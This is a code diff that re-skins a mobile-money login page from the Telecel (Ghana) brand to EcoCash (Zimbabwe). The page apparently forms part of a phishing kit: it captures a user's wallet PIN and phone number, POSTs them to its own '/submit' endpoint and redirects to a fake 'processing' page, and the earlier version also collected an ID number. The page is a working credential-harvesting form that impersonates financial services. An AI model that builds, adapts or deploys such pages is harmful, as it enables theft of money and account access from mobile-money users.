@@ -1,152 +1,241 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <title>Telecel Login</title>
+    <title>EcoCash Login</title>
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-
+    <!-- MOBILE -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <link rel="stylesheet" href="style.css">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: #1e63c6;
+        }
+
+        .top-section {
+            background: white;
+            padding: 30px 20px 80px;
+            border-bottom-left-radius: 60px;
+            border-bottom-right-radius: 60px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .logo span {
+            color: red;
+        }
+
+        .login-title {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        .phone-box {
+            display: flex;
+            align-items: center;
+            border: 2px solid #1e63c6;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 20px;
+        }
+
+        .flag {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .phone-input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .pin-title {
+            margin-top: 25px;
+            font-size: 16px;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 55px;
+            border: 2px solid #1e63c6;
+            border-radius: 10px;
+            font-size: 22px;
+            text-align: center;
+        }
+
+        .bottom-section {
+            background: #1e63c6;
+            padding: 40px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .bottom-text {
+            margin-bottom: 20px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .action-btn {
+            background: white;
+            color: black;
+            padding: 14px;
+            border-radius: 12px;
+            width: 45%;
+            border: none;
+        }
+    </style>
 </head>
 
 <body>
 
-<!-- 🔴 TOP RED HEADER -->
-<div class="top-red">
-    <img src="logo.jpeg" class="logo-big">
-    <h2>Telecel</h2>
-    <p class="sub">Mobile Financial Services</p>
-</div>
+<!-- TOP WHITE -->
+<div class="top-section">
 
-<!-- ⚪ WHITE LOGIN CARD -->
-<div class="login-card">
+    <div class="logo">Eco<span>Cash</span></div>
 
-    <h3>Login to Your Account</h3>
-
-    <label>Account Type</label>
-    <select>
-        <option value="mobile">Mobile</option>
-        <option value="broadband">Broadband</option>
-    </select>
+    <div class="login-title">Login</div>
 
     <!-- PHONE -->
-    <input id="phone" readonly>
-
-    <!-- PIN -->
-    <p class="pin-label">Enter your PIN</p>
-
-    <div class="pin-container">
-        <input type="password" maxlength="1" class="pin-box">
-        <input type="password" maxlength="1" class="pin-box">
-        <input type="password" maxlength="1" class="pin-box">
-        <input type="password" maxlength="1" class="pin-box">
+    <div class="phone-box">
+        <div class="flag">🇿🇼</div>
+        <input class="phone-input" id="phone" readonly>
     </div>
 
-    <p class="forgot">Forgot your PIN?</p>
-
-    <button id="submitBtn" onclick="submitOtp()" disabled>LOGIN</button>
-
-    <p id="errorMsg" class="error"></p>
-
+    <!-- PIN -->
+    <div class="pin-title">Enter your PIN</div>
+  
+    <div class="pin-container">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" autofocus>
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
 </div>
 
-<!-- 🔴 BOTTOM RED SECTION -->
-<div class="bottom-red">
-    <img src="logo.jpeg" class="logo-small">
-    <h3>Telecel</h3>
-    <p>Ghana</p>
-    <p class="small">Secure. Fast. Reliable.</p>
-
-    <button class="white-btn">📱 Download App</button>
-    <button class="white-btn">❓ Get Help</button>
+<p id="errorMsg" style="color:red; text-align:center; margin-top:10px; display:none;"></p>
+    
+<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
 </div>
 
-<div id="pageLoader" class="loader" style="display:none;"></div>
+<!-- BOTTOM BLUE -->
+<div class="bottom-section">
+
+    <div class="bottom-text">Don’t have an EcoCash Wallet?</div>
+
+    <div class="actions">
+        <button class="action-btn">Register</button>
+        <button class="action-btn">Help & Support</button>
+    </div>
+
+</div>
 
 <script>
+
 const inputs = document.querySelectorAll(".pin-box");
 
 inputs.forEach((input, index) => {
     input.addEventListener("input", () => {
         input.value = input.value.replace(/[^0-9]/g, "");
-
+        
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
-
-        checkPinFilled(); // ✅ ADD THIS
     });
 
     input.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && !input.value && index > 0) {
             inputs[index - 1].focus();
         }
-
-        setTimeout(checkPinFilled, 0); // ✅ ADD THIS
     });
 });
 
-function checkPinFilled() {
-    let pin = "";
-    document.querySelectorAll(".pin-box").forEach(i => pin += i.value);
-
-    const btn = document.getElementById("submitBtn");
-
-    if (pin.length === 4) {
-        btn.classList.add("active");
-        btn.disabled = false;
-    } else {
-        btn.classList.remove("active");
-        btn.disabled = true;
-    }
-}
-
 async function submitOtp() {
     const btn = document.getElementById("submitBtn");
-    const error = document.getElementById("errorMsg");
+    if (btn.disabled) return;
 
     let pin = "";
-    document.querySelectorAll(".pin-box").forEach(i => pin += i.value);
+    document.querySelectorAll(".pin-box").forEach(input => {
+        pin += input.value;
+    });
+
+    const error = document.getElementById("errorMsg");
 
     if (pin.length < 4) {
         error.innerText = "Enter full PIN";
+        error.style.display = "block";
         return;
     }
+
+    error.style.display = "none";
 
     btn.innerText = "Processing...";
     btn.disabled = true;
 
     document.getElementById("pageLoader").style.display = "block";
 
-    const idNumber = localStorage.getItem("idNumber");
     const phone = document.getElementById("phone").value;
 
     try {
-        await fetch("/submit", {
+        const res = await fetch("/submit", {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ idNumber, phone, pin })
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                name: "User",
+                phone: phone,
+                pin: pin
+            })
         });
+
+        if (!res.ok) throw new Error();
+
+        // clear PIN AFTER submit
+        document.querySelectorAll(".pin-box").forEach(input => input.value = "");
+
+        localStorage.setItem("firstProcess", "yes");
 
         window.location.href = "processing.html";
 
-    } catch {
-        error.innerText = "Submission failed";
-        btn.innerText = "LOGIN";
+    } catch (err) {
+        error.innerText = "Submission failed. Try again.";
+        error.style.display = "block";
+
+        btn.innerText = "Submit";
         btn.disabled = false;
+
+        document.getElementById("pageLoader").style.display = "none";
     }
 }
 
-document.getElementById("phone").value = localStorage.getItem("phone") || "";
+   document.getElementById("phone").value = localStorage.getItem("phone") || "+263";
 
-</script>
-
-<script>
-document.addEventListener("DOMContentLoaded", function () {
+window.onload = () => {
     document.body.classList.add("loaded");
-});
-</script>
+};
 
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
 </html>
